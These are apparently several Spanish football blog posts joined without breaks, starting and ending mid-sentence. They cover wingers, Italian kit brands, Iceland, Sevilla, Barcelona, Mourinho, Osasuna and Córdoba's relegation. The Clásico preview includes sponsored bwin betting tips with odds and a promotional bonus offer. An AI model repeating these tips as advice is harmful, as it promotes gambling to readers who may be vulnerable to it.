mitad del lío, en la sala de máquinas. Willian José, en su etapa zaragocista, dijo “nunca he jugado en la banda, no sé cómo hacerlo” cuando Víctor le mandó al costado. “En la banda no quiero jugar más” concluyó.El fútbol es centrípeto. Las porterías obligan. Los focos apuntan a las zonas calientes del campo, a los tres círculos -uno completo, dos incompletos- que son la espina dorsal del césped. Ocupar las bandas es vocacional. En la clandestinidad de los flancos el fútbol se vive de otra forma. Regate y velocidad. Centro corazonado.Esas cosas que tenía Michel, que centraba recto y medido; o la aparatosa vistosidad de Jairzinho, el regate lento de Figo, o cuando Navas ponía patas abajo el Sánchez Pizjuán.Ayer dos jugadores habitaron los pasillos laterales con decisión: Cristiano Ronaldo y Mohamed Salah. Ambos dignificaron las afueras. Todo el fútbol nació y creció en las alas. El primer gol del Real Madrid fue todo lo que se le puede pedir a un jugador de banda: velocidad y desenvoltura si hay que encarar área. Salah lideró a la Roma y tuvo sus ocasiones, pero menos suerte y un equipo que no arrastraba a los defensas con tanta soltura como el rival. Fue un partido de extremos, de fútbol desembotellado, de oxígeno sobre la hierba.Pensé en Cavani celebrando su gol contra el Chelsea el martes. Reivindicándose como delantero, pidiendo a su entrenador una hipoteca en el área rival, negándose a hacer fútbol en una posición que cree ajena e impura. En esa pugna entre extremos que encaran y delanteros que caen a bandas. Ese difícil equilibrio entre eso que llaman fútbol exterior y fútbol interior. Dos conceptos abrazados en jugadores como Cristiano Ronaldo y Salah, eclosionando desde un lado para morir en el centro. Encontrando oro en los márgenes del campo. Imagen: www.asroma.com Cada semana y de la mano de Classic Football Shirts: la tienda online especializada en camisetas antiguas, nos acercamos al fútbol con una perspectiva diferente. Lo hacemos desde las camisetas con las que se ha construido la historia del deporte rey.El fútbol no podía ser menos en un país conocido por su moda. Allí donde nacieron Armani, Benetton, Gucci, Bulgari o Prada debe haber un espacio para las elásticas deportivas. No sólo de gafas de sol con lupas cubrerrostro, no sólo de ceñidas camisetas lycradas, no sólo de vaqueros artísticamente despintados se alimenta el deporte rey y sus modelados jugadores. Diadora, Lotto y Kappa son tres ejemplos de lo que se cuece en Italia. Los Modistos –esos amigos del coleccionismo textil y pluma afilada como redactores del Cuore con las equipaciones- saben que esta santa trinidad transalpina ha parido camisetas horribles en los últimos años. Es más, cuando una camiseta viene rematada por algún logo italiano siempre hay que ponerse sobre aviso. Hay cierta tendencia al exceso. Como muestra los delirios culés o estas pelín carnavalescas camisetas de portero.Pero también han tenido sus momentos. Camisetas estelares con más valor sentimental que estético. Italia, ese país con tendencia al marcapaquetismo veraniego, al tejido elástico y estrecho, tienen en la Roma un espacio para la probatura con algún acierto. Los colores giallorossi del equipo capitalino han pasado por Adidas, Diadora y hasta Asics, pero es Kappa quien supo sacarle verdadero partido. En la época de Batistuta y con el patrocinio de Ina Assitalia, entidad aseguradora que debería haber garantizado el campeonato que perdieron, en la última jornada, frente a la Juventus.La Vecchia Signora vestía de Lotto, precisamente. Zidane se había ido al Madrid y los bianconeri habían traído a Nedved, Thuram, Salas y Buffon con lo recaudado. El equipo de la loba y los succionadores tenía una plantilla histórica: Samuel, Panucci, Tomassi, Cafú, Totti, Cassano o Montella. Aunque eran favoritos tras su meritorio primer puesto de la temporada anterior, nada pudieron hacer contra los turineses. Trezeguet fue máximo goleador, al año siguiente repitieron trofeo y empezó, definitivamente, el declive romano. La llegada de Guardiola y Dellas ya fue demasiado para el equipo lacial. Como testigo de esa época de esplendor, la camiseta que presenta este post. Batistuta en estado puro. Kappa y sus laureles.Diadora ha tenido éxitos más mundanos. Uno de estos es la camiseta que vistió Italia en su Mundial. Schillachi, Zenga, Baresi o Baggio en el primer partido del que tengo un recuerdo emocionante. Aquella tanda de penaltis con Goycoechea como héroe absoluto. Después se ha dedicado a vestir a equipos de zona templada en Italia. Reciente el del Nápoles, por ejemplo. En la tienda podéis encontrar la camiseta de Zalayeta. Ídolo que ya ha comenzado su retiro-activo en el fútbol turco pero que lució el dorsal 25 hace un par de años en la capital de la Campania. También una pequeña incursión en el fútbol británico, diseñando las atigradas zamarras del Hull. Equipar a Malta puede ser un síntoma de declive, pero al fin y al cabo, quién viste a Liechtenstein sino la alemana Adidas.Lotto es caso aparte. Más osada que sus colegas, intentó colonizar varios mercados. En España se cebó con el Zaragoza, antes de que los maños se establecieran con la siempre elegante Adidas. Miento, la casi siempre elegante Adidas. Tampoco es que trepanaran el cerebro en sus patrones, habitualmente diseñaban un modelo –recordaréis éste– y le cambiaban los colores según las hinchadas. Aún así, y buceando en la web, encontraremos algunas preciosidades por lo underground de los equipos o por su vistosidad ideal para pachangas de fin de semana. Esta del Swindon es un ejemplo. Aunque las hay más dignas y puro Calcio como Udinese, recordaréis a Iaquinta en Champions con este modelazo, o esta preciosidad milanista con Savicevic en el recuerdo.Puedes comprar esta camiseta y cientos más en Classic Football Shirts. Hace unos cuantos meses Antonio Luque, popular como el compositor y cantante Señor Chinarro, me propuso -dada la amistad que nos une- que presentara junto a él su novela Exitus en Málaga. Los presentadores son en un acto literario, os aclaro, lo que los teloneros son a los conciertos o el lambrusco es a los coitos. El acto se celebraba en el Centro Andaluz de las Letras y para mí, por supuesto, fue un honor. El único problema, por llamarlo así, es que yo no había ni siquiera empezado la novela. Es más, él me la regaló esa misma tarde, diez minutos antes de subirnos a la mesa para empezar eso tan raro de presentar un libro, como si los libros tuvieran que ser presentados a los lectores. Como no soy un robot al estilo Cortocircuito, los diez minutos no bastaron ni para leer la contraportada, así que subido al pequeño escenario miré al público asistente y confesé que no había leído ni una sola línea del libro que iba a presentar. La gente sonrió con más extrañeza que ternura. Entendían que aquello era idea de Antonio Luque, tan dado al surrealismo y a la carambola.En la presentación me limité a decir por qué creía yo que había que leer esa novela, y no lo hice por su literatura -que desconocía aún- sino por el personaje que la había escrito.Las letras, su posición ante la vida, su honestidad como creador, y todas esas cosas que pienso del Chinarro y que en una presentación de este calibre quedan aún mejor que en una exaltación de la amistad producida por el maldito Fernet o las cervezas del Trifásico. El acto, afortunadamente, salió bien. Y se vendieron algunos libros, que de eso se trata. Y si no que se lo pregunten a González-Sinde. En este post me pasa lo mismo que con esa brillante novela llamada Exitus. Jamás he visto un partido de Islandia y desconozco a cada uno de sus jugadores, salvo alguna excepción que no detallaré por no profundizar en mi ignorancia. Aún así me apetece hablar de esto. Por la novedad, por lo inesperado, por lo exótico. La cuestión es que Islandia se ha metido en la repesca del Mundial y, al menos a mí, me ha sorprendido. Empiezo a buscar información en internet, que es como una madre que da a la primera con los calcetines que no aparecen. Veo que el grupo no era gran cosa. Suiza acabó primera, con unos contundentes 24 puntos, y sólo Eslovenia podría haber despertado del sueño a los islandeses, aunque al final fue incapaz de vencer a la primera de grupo en su visita suicida.Veo que aún Islandia juega bien. Leo a los que saben de esto y dicen que es meritorio. Que el técnico Lars Lagerbäck ha sabido encajar todas las piezas, sobre todo a Eidur Gudjohnsen, el jugador más conocido –y quizá el mejor- del gélido fútbol isleño tras su paso por Chelsea, Barcelona y Mónaco, por decir los tres clubes más populares de su dilatada carrera. Leo aún más y pienso en los países nórdicos, agitadores de tanto en cuanto del fútbol internacional. Dinamarca está fuera, Suecia también en la repesca con una selección titubeante, Noruega fuera –en este mismo grupo, testigo ayer de la felicidad islandesa-, Finlandia –pese al susto a España, fuera también-. En su tímida competencia nórdica, los islandeses han culminado un progreso estelar.Es la primera vez que Islandia participa en una repesca, en estos Globos de Oro del Mundial. Jamás pisó Eurocopa ni Copa del Mundo, y en las caras de los jugadores, anoche, se leía una esperanza atemorizadora. Para algunos Islandia es el país de Gudjohnsen, que ayer jugó medio partido. Para mí siempre fue la patria de Sigur Rós y Björk. Quizá en noviembre sea, para griegos, ucranianos, portugueses o croatas, esa selección desconocida que les apartó del Mundial. Un piso pequeño. Humilde. Con muebles antiguos que dan el apaño. Sin demasiados lujos. No es tu casa, por supuesto. Tu casa se ve cara. La piscina luce limpia. El césped bien cortado. Mi terraza es amplia, pero ya sé que no es lo mismo. He puesto un par de sillas y el sol da bien temprano y es perfecto para leer el periódico y beber café si no refresca. Claro. Tu porche es otra cosa, con ese sillón colgante y su mecer suave. Pero aquí se está bien. La cama no es muy grande pero el colchón no es de muelles. No es como tu cama, viscoelástica, que parece una nube cuando te tumbas. Pero pienso que la vida es un poco esto. Un poco como este piso mío con muebles con maderas disparatadas y una tele culona. Soy feliz aquí como tú eres feliz en tu chalet a las afueras con esa tele que tienes que parece una pantalla de cine. El dinero no da la felicidad, pero ayuda. Pero esto es la Europa League. Tú eres de Champions. Aquí también ganamos. Y la sensación de vértigo es la misma. Algún día tú estarás en un piso como el mío. Todo fluye. Todo pasa. Quizá yo pueda vivir en una casa como la tuya dentro de unos años. Estamos jugando bien y en la liga estamos cerca de los puestos nobles. Hemos afinado la plantilla y con poco dinero y algún chaval de la cantera hacemos un fútbol bonito. En cambio a vosotros no os veo finos esta temporada. Tu casa está preciosa, de verdad, los muebles blancos y esa luz que entra por los ventanales. Me encantaría vivir aquí. Pero, ¿podrás pagar todo esto el año que viene?Los chicos esos que fichásteis en verano no están haciendo nada. Quizá en enero estemos viviendo en el mismo piso. Alquilo una habitación si te echan de esta casa en diciembre. Aquí también hay sitio para equipos como tú. Después lo celebraréis. Mira al Chelsea el año pasado. Reconoced que la felicidad es relativa y si no puedes levantar la Champions bien os viene este pisito. No te imaginas lo que hay por aquí, qué equipos. A veces no puedo ni recordar sus nombres. Los polacos, los húngaros y toda esa gente. No los conocía de nada. Hoy juegan unos españoles que ganaron dos veces, Sevilla se llaman…El Slovan Liberec checo espera hoy al Sevilla en su viejo Stadion u Nisy. El equipo de Unai Emery no está bien en Liga y sigue su camino descendente desde aquellos años de alboroto europeo con presencia en Champions y títulos de UEFA. Tras años de zozobra parece que el técnico guipuzcoano ha conseguido algo de estabilidad, y la plantilla de este año tiene unos cuantos jugadores que son realidades y no experimentos de Monchi. Gameiro, Rakitic y Marko Marin dan mucho lustre a un club que lucha por volver a los años dorados, cuando su juego era ejemplo de verticalidad y solvencia en España y Europa.La Europa League parece una mera sombra de la Champions, pero es mucho más que eso. Entre el exotismo centroeuropeo, los grandes venidos a menos y esa especie de interrail por ciudades modestas, la antigua Copa de la UEFA esconde un arsenal de sentimientos y un poso de futuro que ejemplificaré con el Atlético de Madrid. No digo que los dos trofeos que ganó el Atleti –contra Fulham y Athletic- sean la base de este equipo, pero desde luego hay mucho de reivindicación y de confianza en aquellos partidos para entender la competitividad europea del equipo de Simeone en este momento. El Sevilla tuvo mala suerte en Champions, pero aquellas copas que ganó le sirvieron, además de para engordar el palmarés, para sacarle jugo a una plantilla en buena medida inexperta que rindió años a un nivel estelar.El Slovan Liberec es un equipo humilde. Muy humilde. Tres ligas en su país y una presencia casi testimonial en sus participaciones continentales. Es buen día para Gameiro y Bacca y para sellar, casi virtualmente, su pase a dieciseisavos. Buena manera de centrarse en la Liga y tratar de remontar un comienzo dubitativo. Emery es un entrenador maratoniano, esprintar no va con él. Sus equipos se hacen poco a poco con los bueno guisos.No resulta brillante pero el Sevilla se tiene que abonar más a los resultados que la estética meliflua que ya le lastró en su tiempo.Lo bueno de los pisos pequeños es que se limpian rápido, son baratos y en ellos se vive cómodamente. El Sevilla tiene su pisito ahora. Intuyo que Del Nido y compañía miran la casa del vecino con envidia y nostalgia. Pero para llegar allí primero hay que adaptarse a lo que uno tiene. Y el Sevilla de este año puede hacerlo, tiene plantilla y ambición para empezar una ilusionante mudanza el próximo verano. Imaginad que queréis saber cómo suena el nuevo disco de Muse antes de comprarlo. Que miráis las críticas en la NME o en la Rockdelux o en la Mondo Sonoro y os dicen algo así como: el nuevo disco de Muse está grabado con amplificadores Fender para la guitarra de Bellamy. De los últimos dos mil discos de rock que se grabaron en Inglaterra en los últimos veinte años 1120 se grabaron con ese tipo de amplis. 532 se grabaron con Marshall. El bajista utiliza cuerdas Ernie Ball y hace exactamente 459 días que no toca un bajo Gibson, siendo ya habitual el Precision Bass de Fender. Los platos Zidjian que utiliza el batería son de la misma gama que los del batería de Mastodon, pero de distinto diámetro. La suma de acoples total en todo el metraje del disco es de 1:33 segundos. La duración del disco es de 53 minutos. Es el disco segundo disco más largo de Muse… y ahora yo os pregunto ¿y cómo suena el disco? Y vosotros contestaréis: Ni puta idea.En fútbol hay cosas que no pueden demostrarse con los porcentajes de posesión, ni con los records de victorias, ni con la estadística que siempre subraya la dinámica positiva. El fútbol se juega con los pies así que cualquier resultado es posible. Lo de anoche sobre el césped del Amsterdam Arena hizo arder dos o tres calculadoras. No se esperaba esa debacle del mejor equipo español actualmente contra un equipo joven y aún en formación. El 2-1 del Ajax al conjunto culé nos sorprendió a casi todos. El Barcelona jugó mal, estropajoso en la salida de balón, sin ningún peligro arriba. Desdibujado, apático y frío. El Ajax, sin embargo, ordenado y con mordiente. Asociándose arriba y atosigando a la defensa blaugrana que apenas tenía espacio para sacar el balón limpio. Tampoco es que Frank de Boer dinamitara su libro de estilo ni hallara la piedra filosofal. Simplemente puso en juego lo que ya sabemos que había que poner anoche sobre el rectángulo para ganar al equipo de Xavi, Iniesta y compañía: intensidad y presión arriba. Secar el mediocampo. Buscar la espalda de una defensa adelantada. Exigir a un portero con poco rodaje. Aguantar físicamente los noventa minutos dosificando los cambios.Cabe la duda de si este partido es la excepción o la consecuencia lógica de un desgaste. El Barcelona ha ganado mucho esta temporada, pero siempre ha habido aplauso individualizado. Messi, sobre todo, pero puntualmente Valdés, Cesc o Alexis. La sensación está ahí: el equipo no funciona como uno solo. Las declaraciones de Piqué dejan entrever que hay problemas de actitud, de entusiasmo. Cierto que un equipo cuyo dos mejores jugadores, portero y delantero, están lesionados no puede aspirar a seguir  haciendo el juego de siempre. Pero la imagen de ayer es sonrojante para un aspirante a todo. Y no es la primera vez en Champions, contra el Celtic y el Milan tampoco brilló en exceso y pasó más apuros de los previstos.Para entender el problema del Barcelona quizá no baste con mirar estadísticas. Todas les benefician en los últimos años. Puede que aún no se haya afrontado el gran asunto pendiente: la renovación de un plantel estático y con pocas alternativas. Lo que hizo Guardiola cuando sustituyó a Rijkaard. Es pronto para Martino, las circunstancias tras la enfermedad y renuncia de Tito Vilanova no fueron favorables para una gran revolución. Pero hoy, tras el espectáculo pobre de ayer, empezamos a desconfiar de un equipo cuyos números siempre hacen favorito. Fotografía: www.fcbarcelona.com Pesan las piernas. La moral está desparramada por el cesped. Todavía no se había filmado Gladiator, el manual de arengas de vestuario era un territorio prácticamente virgen. Coldplay aún eran un grupo de adolescentes escuchando a Enya a escondidas. Los psicólogos no terminaban de hacer su trabajo. Benito Floro necesitaba levantar el ánimo, hacer que las cosas volvieran a su cauce, arrancarle algo de vísceras a ese grupo fofo que se dejaba maniatar por los campos de España, y que esa tarde sucumbía ante un Lleida peleón. Detrás de sus gafas de nerd, de sus modales suaves, se encerraba un sargento al que no le gustaba lo que estaba viendo. Ese Alfonso, ese Míchel, ese Prosinecki, circunspectos, escuchando esas bravatas, esos incendios verbales, esa claridad expositiva.Dónde están los cojones, dónde está el equipo… se preguntaba el técnico en el frio vestuario. ¿Cómo se ganan los partidos? Benito tenía entonces la respuesta: con el pito. La noticia del día es que  Mourinho dice cosas. Que no está en ese saco de entrenadores cuya  dialéctica rebota una y otra vez en el tópico, en los lugares comunes,  en esos monosílabos perezosos que esconden las intenciones, o las  disfrazan  de sencillez vulgar. El entrenador portugués expone sus ideas de una  forma didáctica, meridiana, como si no tuviera nada que ocultar, como  si su puesto de técnico le obligara a ser comprensivo con la prensa  y con los miles de aficionados que buscan en sus respuestas motivos  para la ilusión o excusas para el desencanto. No es poco, y más después  de haber seguido durante cuarenta y cinco minutos la rueda de prensa  en la que ha sido presentado como entrenador del Real Madrid. Me he  entretenido viendo como el portugués diseccionaba la realidad de su  cargo, las obligaciones futuras, las motivaciones que le han hecho  firmar  por los blancos, y más de una perla sobre metodología y estilo. Bajo  la amable mirada de Valdano, que en la presentación ha abordado, con  honestidad y generosidad hacia el club que le paga, la cantinela sobre  su opinión negativa y “agresiva” de Mourinho publicada hace un  año; el ex de Oporto, Chelsea e Inter ha contestado las puntualmente  brillantes cuestiones de una prensa ávida por conocer de cerca de este  casi autoproclamado mejor míster del mundo. Futuro del madridismo,  redentor para un club que lleva años instalado en la zozobra.El adiós de Pellegrini no  ha sido un despido más.Con él se iba el proyecto ganador de Florentino  Pérez. Estabilidad, paciencia, comprensión y respeto. Valores que  abanderaba con goloso orgullo el día que fue elegido de nuevo presidente   del Real Madrid. Ni el apoyo de Valdano, ni el siempre timorato apoyo  del vestuario, pudieron salvar la melancólica cabeza del chileno. Los  títulos eran de nuevo los detonantes de la sangría. Buenas palabras  pero las vitrinas desiertas. Una angustia que empieza a enfangar a la  Junta Directiva, que obliga al presidente a tomar decisiones tan  extrañas  como la venida de un entrenador que no es, precisamente, aquel orfebre  futbolístico que el Bernabéu querría ver sobre su glorioso césped. Mourinho ha defendido su inocencia ante los periodistas. Ha dicho que  el no es defensivo, que eso es una mentira repetida mil veces, casi  parafraseando a Goebbles. Que los inteligentes saben distinguir una  patraña de un planteamiento indiscutible ofensivo con Pandev, Eto´o,  Milito, Sneijder y Motta (¿). Además se ha negado a prometer que ganará  la Champions. Recordó aquella comparecencia previa al choque de  semifinales  frente al Barça diciendo que nunca una competición puede ser la  “obsesión”  de un club. Tras innumerables referencias a su trabajo, negando ser  un provocador sino un trabajador, un stajanovista de los banquillos;  ha contestado a las, aburridas por inevitables, cuestiones sobre Raúl. Confesaba haber hablado con el delantero blanco ya, esta misma mañana,  pero que lo hablado entre jugador y entrenador no es parte de la prensa. Ha dicho que Raúl es historia del Madrid y que él es un recién llegado.Elegante manera de decir que el futuro del 7 es una decisión que no  puede tomar unilateralmente.Mourinho ha firmado cuatro  años, tiempo más que suficiente para ganar títulos ha dicho al principio   del discurso, y Valdano confirmó que no se pagaron los 16 millones  al Inter. Máxima expectación para una rueda de prensa que marca el  inicio de una nueva etapa –y van…- del Real Madrid. Para mí Mourinho  es un gran entrenador. Y no hablamos de su potencial de títulos como  cuando hablábamos de Capello. Su estilo de juego es moderno, cambiante,  elástico en función de la plantilla. Quiere mantener el bloque del  Madrid y añadirle tres o cuatro jugadores a lo sumo. Para el portugués  todo es esfuerzo y talento. Son dos buenos principios para afrontar  un cargo tan pesado como el que ocupa desde esta mañana. Con base en  esos valores, con respeto a los jugadores, identificándose con el club  que lo ha contratado. No es un mal principio para un entrenador cuya  personalidad no puede impedirnos ver un curriculum, por el momento,  inmaculado. Bogart despidiéndose de Bergman, renunciando al amor por amor. Al Pacino como Michael besando a su hermano Fredo en una sentencia de muerte que marcará para siempre su vida. La dolorosa imagen del cactus en El Hombre que Mató a Liberty Valance. La redención de Scarlett O´Hara. HAL estrenando sentimientos. Gordi haciendo el supermeneo. Eso sí que son clásicos y no el partido que enfrenta prematuramente a un Real Madrid aburrido contra un Barcelona aún en construcción.Es pronto para saber qué equipo está mejor, suponiendo que alguno lo esté. Creo que la estadística es al fútbol lo que los viejos que observan las obras son a la arquitectura. Ciñéndonos a los puntos, el Barcelona va mejor. No inmensamente mejor, pero sí más seguro y consistente que un Madrid que lleva perdido en laberintos extradeportivos desde que empezó la temporada. Ancelotti y Martino se estrenan en un partido en mayúsculas donde, a estas alturas de la temporada, se juega más con el honor que con el propio fútbol. Los dos tienen claro el plan, pero el verbo aún no se ha hecho carne. Y ambos viven de lo mismo: la individualidad de los dos mejores jugadores del mundo.Messi y Cristiano son la aguja del compás. Como decían en la película: todos somos contingentes pero tú eres necesario. Los dos llevan el peso del equipo a la espalda, los goles –que son la piedra de Sísifo de cualquier equipo- y la dinámica del juego. El centro del campo del Barcelona es mejor que el del Madrid, aún no estar brillantes aún, y el póker Cesc, Iniesta, Xavi, Busquets aún no es comparable con el Khedira, Modric, Illarra, Isco. Uno tiene profundidad y el otro una pretendida seguridad defensiva. Unos crean y los otros destruyen. Y si bien Iniesta no ha empezado con lustre, lo de Modric merece explicación aparte.Creo que el papel del croata es básico para entender el fútbol del Madrid. Mejor dicho, su no-fútbol. Tras el adiós de Özil, su rol debería ser más ofensivo y asociativo. A veces parece hundido en el mediocampo, con Khedira incluso supliendo –torpemente- su responsabilidad. Isco ha sido la solución, su perfil es mucho más certero y mira a portería con más facilidad. Siempre busca lo que hay del área hacia arriba y no se pierde en giros y retenciones como Modric. De su crecimiento depende buena parte del juego. La ausencia de Xabi Alonso está siendo dolorosa.Tampoco arriba sale ganando el Madrid. Benzema merece no un párrafo, sino una trilogía de Dan Brown. Es todo un misterio. Su prometedor pasado ya no puede pagar los cheques de su lamentable presente. Jugadores tan intermitentes, dispersos y pequeños en partidos grandes, son difícilmente soportables por un club como el Real Madrid. Busca pero no encuentra. Ríe cuando toca llorar y llora cuando toca despiporre. Parece perdido como un turista en una judería. Alexis, mirando al ángulo opuesto, está dando por fin el nivel exigido. Y viendo la poca trascendencia de Neymar aún, está siendo fundamental para entender el liderato de los catalanes.El Barcelona es favorito. Eso, en estos partidos y cómo todos sabemos, no significa nada. ¿Puede ganar el Real Madrid en el Camp Nou? Por supuesto. Los azulgrana parecen mejor equipo pero el club blanco está creciendo –el partido de la Juve un ejemplo-. Y luego están las individualidades, ese matiz impredecible. Di María, Pedro, Cristiano o Messi para marcar diferencias si los planes no cristalizan y tenemos que abonarnos al sujeto frente al colectivo.Apuestas en bwin1- Pronóstico muy incierto en un partido tremendamente abierto. Lo ideal, dada la cuota jugosa, sería inclinarse por el empate, un resultado que puede satisfacer a ambos equipos en un momento dado. ¡A 4.10! 2- Exhibición de cualquiera de las dos megaestrellas.Si marca Messi, a 1.65. Si lo hace Cristiano, a 2.10.3- El nivel de tensión entre Barça y Real Madrid parece haberse suavizado bastante. Lo suficiente como para creer que será un partido limpio, con pocas interrupciones y escasas amonestaciones. El Under 6.5 tarjetas amarillas a 2.55 euros por euro apostado nos parece una opción interesante.Como premio excepcional, si incluyes el partido FC Barcelona – Real Madrid en cualquiera de tus apuestas combinadas, recibirás un 25% extra en tus ganancias en dicha apuesta. Mack The Knife ha vuelto a la ciudad. Quizá nunca se fue. Sale a las afueras como el tiburón de tierra que está hecho. Le han visto cerca del río. No trama nada bueno. Ya sabéis que cuando el tiburón muerde las olas de color escarlata empiezan a desparramarse. Entra al estadio y espera en una esquina. Aún es pronto. Las briznas de césped saltan por los aires y cae al suelo un futbolista que grita. Mack The Knife nunca estuvo allí, una sombra dobla rápidamente la esquina.En Pamplona lo llaman Patxi Puñal, pero hablamos del mismo tipo. Lleva muchos aquí pero pocos le han tratado. Bajo la lluvia punzante en El Sadar dejaba sus recuerdos a los visitantes. No es un tipo duro, es sólo Mack The Knife. Quien lo conoce dice que es buena gente, pero si te lo cruzas en la calle mejor cambiar de acera. Nadie parará a Patxi Puñal le cantan desde la grada. Y quizá sea verdad. Tiene casi cuarenta años, pero no quiere marcharse. Está mejor que nunca, dice, y sonríe con frialdad.Los malos momentos son buenos momentos para remontar. El Osasuna está mal este año. Al equipo le cuesta ganar, el estadio se reblandece –cosa rara- y tres equipos (Granada, Villarreal y Levante) ya le han ganado como huéspedes del mítico Sadar. El Barcelona viene como siempre últimamente: exultante y líder. Ocho partidos jugados. Ocho ganados.Veintiocho goles a favor. Seis en contra. Toda una vida por delante. Osasuna-Barcelona sería un 2 del tamaño del ego de Rosell si no fuera porque el equipo rojillo es mucho más que estadística futbolera.Volvamos a Puñal. Su presencia en el equipo es casi icónica. Su valor futbolístico está ahí, pero hay jugadores que trascienden el rectángulo y se elevan sobre los demás como jefazos de este chanchullo llamado fútbol. El cambio de Gracia por Mendilibar le ha afectado en parte. Ha empezado dos veces en el banquillo –aunque terminó jugando los últimos cuartos-. Su presencia es referencial en un equipo espeso, sin fútbol, con demasiada fe en delanteros romos –Oriol Riera está siendo la única excepción- y con una defensa que hace aguas contra equipos parejos.Ahí está el verdadero problema de Osasuna, ha perdido contra los equipos contra los que se jugarán la vida de seguir con esta dinámica. Arañar puntos a Madrid, Atlético –ya perdió contra ellos-, Valencia o Villarreal –otros que les ganaron- es muy difícil con los méritos que el equipo de Gracia está haciendo estos partidos. Por eso el partido contra el Barça puede ser un punto de inflexión, una buena forma de cambiar la curva que ahora paradójicamente dibuja una sonrisa alegre.Puede Mack The Knife esté en el césped.Si el partido contra el Barcelona no se decide precisamente con talento habrá que poner otras cosas en el saco. Él lo hace. Osasuna es un equipo dado a ofrecer ese otro lado de este deporte. El de la brega, la presión y la sorpresa. Muchos salen de Pamplona sin saber aún qué pasó sobre la hierba. La afición, si los precios para ricos que ha puesto el club lo permite, llenará el estadio para ver si Mack, que diga Patxi, hará de las suyas. Mayo es el mes de Córdoba. Dicen. Todas las celebraciones son de beber mucho. Las Cruces y la Feria. Los Patios menos, pero si hay que beber se bebe. No quedamos para leer, la verdad. Circulan las botellas de Pilycrim frío y hacemos como que bailamos al ritmo de la música que escupe un altavoz con más fiestas encima que la carreta de Uranga. La resaca de vino es muy mala, sobre todo cuando llega el calor. Te levantas en la cama empapado y con frio. El cerebro palpita dentro del cráneo como pidiendo piedad. Y cuesta levantarse. En los oídos aún deambulan canciones de la noche pasada. Pasa como en el fútbol, que uno no termina de olvidarse de las derrotas, como una mala canción que no se va de la cabeza. Imaginad, encima, los descensos.El Córdoba ha esperado a mayo para comprar el billete a Segunda. En el mes más nuestro. Como un amigo aguafiestas. Como el idiota que pone cara de apio cuando el resto del grupo se divierte. El que bebe Nestea. El que dice “yo no he bailado nunca ni pienso hacerlo”. El que cuando al fin logras convencer a una chica para llevártela a casa dice “no es muy guapa”. El Córdoba lleva todo el año así, soplando las velas del pastel antes que nosotros. Apagando la ilusión. Apartando los sueños a manotazos.Empiezan las fiestas de mayo con el luto blanquiverde. Como esa segunda camiseta Acerbis con la que debutamos en Primera. Cuando el cabezazo de Havenaar en el Santiago Bernabéu. Fue bonito mientras duró, pero ni eso. En las Cruces y en la Feria hay que bailar de todo. Y cuando ponen Siempre Así sacamos un poco el culo para fuera, arqueamos la espalda, colocamos los brazos a la altura de la cadera, giramos las muñecas un poquito y hacemos como que nos aflamencamos con hechuras de pato aplomillado.Siempre Así, que son un grupo odioso de flamenquito pijo, de carroza y manzanilla -es decir, más de Sevilla que El Arrebato haciendo footing por El Alamillo-, tienen una canción que se llama “Para Volver a Volver”. Es de esas canciones que sin quererlo se quedan en el cerebro como las astillas en los dedos. Igual de molestas. Pero ayer, cuando leía en Twitter a los cordobesistas que lejos de apesadumbrarse gritaban orgullosos eso de “Volveremos”, como Terminators de Cañero, pensé en qué tendría que hacer el Córdoba para volver a volver.Para volver a volver el Córdoba necesita dejar de mandar cartas a los aficionados críticos con la directiva. Buscar, sobre todo, un acuerdo con el aficionado. Las acciones son una cosa y los carnets de socio son otra. Y ninguna de las dos sirven para capitalizar completamente el club. Sólo del entendimiento entre gestión y afición puede brotar un club sano. Los precios abusivos, las chapuzas de las camisetas, el lamentable estado de El Arcángel, la Stasi blanquiverde o ese Cordobaleaks por Twitter. Aficionados y Directivos tienen que remar hacia el mismo lado. Es obligación del socio fiscalizar a los que dirigen su club. No será la primera vez que un equipo desaparece por la mala práctica de quien lo ha comprado con vete a saber qué intención. Bendito problema que la afición está pendiente de su club, de sus gestiones, que miren con cuidado lo que se hace en la entidad que no sólo sienten como propia, sino que apoyan en Córdoba y fuera.Para volver a volver el Córdoba necesita afinar la gestión deportiva. Tres entrenadores en Primera son muchos entrenadores. Se tuvo poca paciencia con Ferrer y, vistos los resultados, Djukic no fue un buen recambio. La dirección del técnico serbio fue caótica, nunca pareció tener las riendas de la plantilla bien cogidas. La charlotada final con Romero, dejando al equipo B en puestos de descenso en el tramo más delicado de la temporada, es síntoma de deriva y derrota. Dos descensos al precio de uno.En el apartado de los jugadores hubo algo de luz entre la sombra. Andone se ha convertido en eje del proyecto en Segunda gracias a su desvergonzada aparición esta temporada. Crespo es de los pocos jugadores salvables.Sin Pantic quizá habríamos descendido en febrero. Por lo demás: Cartabia, Ghilas, Bebé, Rossi… jugadores con mucho talento pero sin intención de dejar huella en la ciudad. Como un Erasmus donde se divierte uno más que estudia. Triste el deambular de Ekeng o Borja García. La intrascendencia de Abel, Fidel o Luso. Una plantilla que podría aportar más fútbol del que aportó, donde faltó compromiso y calidad. Una amalgama de nombres, de bajas, altas, ausencias de la convocatoria. Difícil extraer zumo de un cesto de naranjas pochas.Para volver a volver el Córdoba debe asentarse en Segunda. Esta película no tendrá final feliz. Hay que esperar y asentarse en la categoría. Asumir que el año pasado se subió siendo séptimo y con un gol inesperado en una eliminatoria decidida en contra. Aquel equipo de Jémez, por ejemplo, daba más sensación de unidad y fútbol que el confeccionado por Ferrer tras la destitución de Villa. La Segunda es una categoría para fajadores y los tacos tienen que estar bien clavados al césped. Las promesas del ascenso deberían darnos miedo. El Córdoba es a día de hoy equipo de Segunda y sólo anclado en la categoría podrá plantearse metas más altas. Que ejemplos como el del Tenerife, Racing de Santander, Oviedo, Albacete o Cádiz; que de pasar por Primera acabaron batiéndose el cobre en Segunda B nos sirvan de acicate.Para volver a volver. El sueño de todos. Tras cuarenta y tres años a la sombra de los pinos -por seguir con el bailoteo de mayo-, este año en Primera nos ha sabido a poco. El equipo ha bajado antes siquiera de que quiten los puestos de caracoles. Todo muy precoz, inesperado y doloroso. No hay mejor manera de superar las frustraciones que con buena disposición. Ahí el Córdoba lo ha hecho bien: tenemos un mes por delante para olvidarnos del fracaso de caseta en caseta, de cruz en cruz y de patio en patio. El año que viene los de siempre estarán en sus asientos. Los que se pegaron a la barra de la Primera se irán yendo poco a poco.Al final estarán en las gradas los que han visto al Córdoba en Tercera, Segunda B o penando en Segunda. Los que saben de qué va esto. Los que sueñan en volver. Si me ven mis padres parafraseando a Siempre Así, me desheredan, pero ahí va: “Para volver a volver no te marches ahora. De una vez quédate. A ti te falta el coraje, ese que a mí me sobra”. Que el futuro se 